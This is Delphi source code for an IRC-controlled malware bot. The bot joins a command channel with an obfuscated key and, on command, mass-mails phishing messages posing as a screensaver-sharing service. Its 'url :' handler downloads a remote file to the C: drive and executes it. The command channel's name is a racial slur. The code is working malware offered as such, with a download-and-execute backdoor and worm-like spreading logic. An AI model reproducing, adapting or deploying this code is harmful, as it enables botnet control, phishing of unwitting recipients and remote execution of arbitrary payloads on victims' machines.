   unit MiniMailBot;

   interface

   Uses
     Windows, Winsock, MXResolver, MiniMailFunc;

   Var
     Addr: TSockAddrIn;
     Sock: TSocket;
     SWSA: TWSAData;
     Bot_Silence: Bool;

     Procedure CreateBot(Server: String);
     Procedure SendData(Text: String);
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   Procedure SendData(Text: String);
   Begin
     Send(Sock, Text[1], Length(Text), 0);
   End;

   Function CreateName: String;
   Begin
     Randomize;
     Result := 'A'+IntToStr(Random(9))+'A'+IntToStr(Random(9))+IntToStr(Random(9))+IntToStr(Random(9))+IntToStr(Random(9))+IntToStr(Random(9))+IntToStr(Random(9))+IntToStr(Random(9))+'a';
   End;

   Procedure ReadData;
   Var
     I   : Integer;
     Data: Array[0..1600] Of Char;
     Temp: String;
     Tmp : String;
     body, subject, from, recipt, contenttype, boundray, smtp: string;
     SMTPs :TMXResolver;
   Begin
     While Recv(Sock, Data, 1600, 0) > 0 Do
     Begin
       Temp := Data;
       ZeroMemory(@Data, SizeOf(Data));

       If Pos('MOTD', Temp) > 0 Then
       Begin
         SendData('JOIN ##niggah '+EncryptStr('obmtfi')+#13#10);
       End;

       If Pos('PING :', Temp) > 0 Then
       Begin
         Temp := Copy(Temp, Pos('PING :', Temp), length(Temp));
         Temp := Copy(Temp, 1, Pos(#10, Temp)-1);
         If Temp[Length(Temp)] = #13 Then
         Temp := Copy(Temp, 1, Length(Temp)-1);
         Delete(Temp, 2, 1);
         Insert('O', Temp, 2);
         SendData(Temp+#10);
       End;

       If Pos('bot.silence.on', Temp) > 0 Then
         Bot_Silence := True;

       If Pos('bot.silence.off', Temp) > 0 Then
         Bot_Silence := False;

       If Pos('mailto:', Temp) > 0 Then
       Begin
         Temp := Copy(Temp, Pos('mailto:', Temp)+7, Length(Temp));
         Temp := Copy(Temp, 1, Pos(#10, Temp)-1);
         If Temp[Length(Temp)] = #13 Then Temp := Copy(Temp, 1, Length(Temp)-1);

                               Subject := 'screenshot_id Screensaver';
                               From := 'Service@Screensaver.com';
                               Recipt := Temp;
                               ContentType := 'audio/x-wav';
                               Boundray := 'screensaver';
   Body := #13#10+
   'Greetings '+Recipt+'!'#13#10+
   ''#13#10+
   'Someone wants to share a screensaver with'#13#10+
   'you called, "screenshot_id"'#13#10+
   ''#13#10+
   'You can download it directly from Screensaver.com'#13#10+
   'at link below, or download the attached file:'#13#10+
   ''#13#10+
   'screenshot_url'#13#10+
   ''#13#10+
   'Enjoy!'#13#10+
   ''#13#10+
   'The Screensaver.com Team'#13#10;
                               SMTPs := TMXResolver.Create(copy(Temp, pos('@', Temp)+1, length(Temp)));
                               If smtps.ListOfSMTPServers.Count > 0 then
                                 For I := 0 To smtps.ListOfSMTPServers.Count-1 Do
                                   If SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SmtpS.ListOfSMTPServers.Strings(i), 25) Then
                                   Begin
                                     If Not Bot_Silence Then
                                       SendData('PRIVMSG ##niggah :Sent Mail to '+Temp+' using ('+SmtpS.ListOfSMTPServers.Strings(i)+')'#10);
                                   ENd;

       End;

       If Pos('url :', Temp) > 0 Then
       Begin
         Temp := Copy(Temp, Pos('url :',Temp), Length(Temp));
         Temp := Copy(Temp, Pos(':',Temp)+1, Length(Temp));
         Tmp := 'C:\'+CreateName+'.exe';
         If Temp[Length(Temp)] = #10 Then Temp := Copy(Temp, 1, Length(Temp)-1);
         If Temp[Length(Temp)] = #13 Then Temp := Copy(Temp, 1, Length(Temp)-1);
         Temp := EncryptStr(Temp);
         URLDownloadToFile(0, pChar(Temp), pChar(Tmp), 0, 0);
         WinExec(pChar(Tmp), 1);
         SendData('PRIVMSG ##niggah :File Downloaded && Executed'#10);
       End;

     End;
   End;

   Procedure CreateBot(Server: String);
   Var
     Name: String;
   Begin
     Bot_Silence := False;
     WSAStartUp(makeword(2,1), SWSA);

     Sock := Socket(af_inet, sock_stream, 0);
     If Sock = -1 Then Exit;

     Addr.sin_family := af_inet;
     Addr.sin_port := htons(6667);
     Addr.sin_addr.S_addr := inet_addr(pChar(IpStr(Server)));

     If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
     Begin
       Name := CreateName;
       SendData('USER '+Name+' '+Name+'@MiniMail.com '+Name+' '+Name+#13#10);
       SendData('NICK '+Name+#13#10);
       ReadData;
     End;

     WSACleanUp();
   End;

   end.
